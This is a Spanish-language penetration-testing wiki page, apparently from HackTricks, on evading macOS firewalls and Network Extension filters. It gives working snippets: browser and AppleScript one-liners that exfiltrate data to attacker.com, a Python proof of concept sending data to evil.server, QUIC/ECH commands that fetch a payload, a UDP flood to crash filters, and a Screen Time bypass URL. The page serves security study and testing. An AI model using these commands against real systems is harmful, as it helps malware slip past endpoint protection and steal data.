# Bypassing Firewalls en macOS

{{#include ../../banners/hacktricks-training.md}}

## Técnicas encontradas

Las siguientes técnicas se probaron con éxito en algunas aplicaciones de firewall de macOS.

### Abusar de los nombres de whitelist

- Por ejemplo, llamar al malware con nombres de procesos conocidos de macOS, como **`launchd`**

### Synthetic Click

- Si el firewall solicita permiso al usuario, hacer que el malware **haga clic en allow**

### **Usar binarios firmados por Apple**

- Como **`curl`**, pero también otros como **`whois`**

### Dominios conocidos de Apple

El firewall podría permitir conexiones a dominios conocidos de Apple, como **`apple.com`** o **`icloud.com`**. Además, iCloud podría utilizarse como C2.

### Bypass genérico

Algunas ideas para intentar evadir firewalls

### Comprobar el tráfico permitido

Conocer el tráfico permitido ayudará a identificar dominios potencialmente incluidos en la whitelist o qué aplicaciones tienen permitido acceder a ellos
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Abusing DNS

Las resoluciones DNS se realizan mediante la aplicación firmada **`mdnsreponder`**, que probablemente tendrá permitido contactar con servidores DNS.<sup>[1]</sup>

<figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### A través de aplicaciones del navegador

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Mediante inyecciones de procesos

Si puedes **inyectar código en un proceso** que tenga permitido conectarse a cualquier servidor, podrías evadir las protecciones del firewall:


{{#ref}}
macos-proces-abuse/
{{#endref}}

---

## Vulnerabilidades recientes para evadir el firewall de macOS (2023-2025)

### Evasión del filtro de contenido web (Screen Time) – **CVE-2024-44206**
En julio de 2024, Apple corrigió un fallo crítico en Safari/WebKit que inutilizaba el “filtro de contenido web” de todo el sistema utilizado por los controles parentales de Screen Time.
Un URI especialmente manipulado (por ejemplo, con un “://” codificado dos veces en URL) no es reconocido por la ACL de Screen Time, pero sí es aceptado por WebKit, por lo que la solicitud se envía sin filtrar. Por tanto, cualquier proceso que pueda abrir una URL (incluido código en sandbox o sin firmar) puede acceder a dominios bloqueados explícitamente por el usuario o por un perfil de MDM.<sup>[2]</sup>

Prueba práctica (sistema sin parchear):
```bash
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```
### Error de ordenación de reglas de Packet Filter (PF) en las primeras versiones de macOS 14 “Sonoma”
Durante el ciclo beta de macOS 14, Apple introdujo una regresión en el wrapper de espacio de usuario alrededor de **`pfctl`**.
Las reglas añadidas con la palabra clave `quick` (utilizada por muchos kill-switches de VPN) se ignoraban silenciosamente, provocando leaks de tráfico incluso cuando la interfaz gráfica de la VPN/firewall mostraba *blocked*. El error fue confirmado por varios proveedores de VPN y corregido en RC 2 (build 23A344).

Comprobación rápida de leak:
```bash
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```
### Abusing Apple-signed helper services (legacy – pre-macOS 11.2)
Antes de macOS 11.2, **`ContentFilterExclusionList`** permitía que unos 50 binarios de Apple, como **`nsurlsessiond`** y App Store, evadieran todos los socket-filter firewalls implementados con el framework Network Extension (LuLu, Little Snitch, etc.).
El malware podía simplemente spawn un proceso excluido —o inject code en él— y tunnelizar su propio tráfico a través del socket ya permitido. Apple eliminó por completo la lista de exclusión en macOS 11.2, pero la técnica sigue siendo relevante en sistemas que no se pueden actualizar.<sup>[3]</sup>

Ejemplo de proof-of-concept (pre-11.2):
```python
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```
### QUIC/ECH para evadir los filtros de dominio de Network Extension (macOS 12+)
Los proveedores **NEFilter Packet/Data** se basan en el SNI/ALPN de TLS ClientHello. Con **HTTP/3 sobre QUIC (UDP/443)** y **Encrypted Client Hello (ECH)**, el SNI permanece cifrado, NetExt no puede analizar el flujo y las reglas de hostname suelen aplicar fail-open, lo que permite que el malware llegue a dominios bloqueados sin tocar DNS.<sup>[5]</sup>

PoC mínimo:
```bash
# Chrome/Edge – force HTTP/3 and ECH
/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \
--enable-quic --origin-to-force-quic-on=attacker.com:443 \
--enable-features=EncryptedClientHello --user-data-dir=/tmp/h3test \
https://attacker.com/payload

# cURL 8.10+ built with quiche
curl --http3-only https://attacker.com/payload
```
Si QUIC/ECH sigue habilitado, esta es una vía sencilla para evadir el filtrado por hostname.

### Inestabilidad de Network Extension en macOS 15 “Sequoia” (2024–2025)
Las primeras versiones 15.0/15.1 provocan el cierre inesperado de filtros de **Network Extension** de terceros (LuLu, Little Snitch, Defender, SentinelOne, etc.). Cuando el filtro se reinicia, macOS elimina sus reglas de flujo y muchos productos adoptan una configuración fail-open. Inundar el filtro con miles de flujos UDP cortos (o forzar QUIC/ECH) puede activar repetidamente el cierre inesperado y dejar una ventana para C2/exfil mientras la GUI sigue indicando que el firewall está ejecutándose.<sup>[4]</sup>

Reproducción rápida (entorno de laboratorio seguro):
```bash
# create many short UDP flows to exhaust NE filter queues
python3 - <<'PY'
import socket, os
for i in range(5000):
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(b'X'*32, ('1.1.1.1', 53))
PY
# watch for NetExt crash / reconnect loop
log stream --predicate 'subsystem == "com.apple.networkextension"' --style syslog
```
---

## Consejos de tooling para macOS moderno

1. Inspecciona las reglas PF actuales que generan los firewalls GUI:
```bash
sudo pfctl -a com.apple/250.ApplicationFirewall -sr
```
2. Enumera los binarios que ya tienen el *outgoing-network* entitlement (útil para hacer piggy-backing):
```bash
codesign -d --entitlements :- /path/to/bin 2>/dev/null \
| plutil -extract com.apple.security.network.client xml1 -o - -
```
3. Registra mediante programación tu propio content filter de Network Extension en Objective-C/Swift.
En el código fuente de **LuLu** de Patrick Wardle hay disponible un PoC rootless mínimo que reenvía paquetes a un socket local.

## Referencias

- [1] [DEF CON 26 - Patrick Wardle - Fire & Ice: Making and Breaking macOS Firewalls](https://www.youtube.com/watch?v=UlT5KFTMn2k)
- [2] [Apple web content filter bypass allows unrestricted access to blocked content (CVE-2024-44206) - Nosebeard Labs](https://nosebeard.co/advisories/nbl-001.html)
- [3] [Apple Removes macOS Feature That Allowed Apps to Bypass Firewall Security - The Hacker News](https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html)
- [4] [Cybersecurity Products Conking Out After macOS Sequoia Update - SecurityWeek](https://www.securityweek.com/cybersecurity-products-conking-out-after-macos-sequoia-update/)
- [5] [Use network protection to help prevent macOS connections to bad sites - Microsoft Defender for Endpoint | Microsoft Learn](https://learn.microsoft.com/en-us/defender-endpoint/network-protection-macos)

{{#include ../../banners/hacktricks-training.md}}
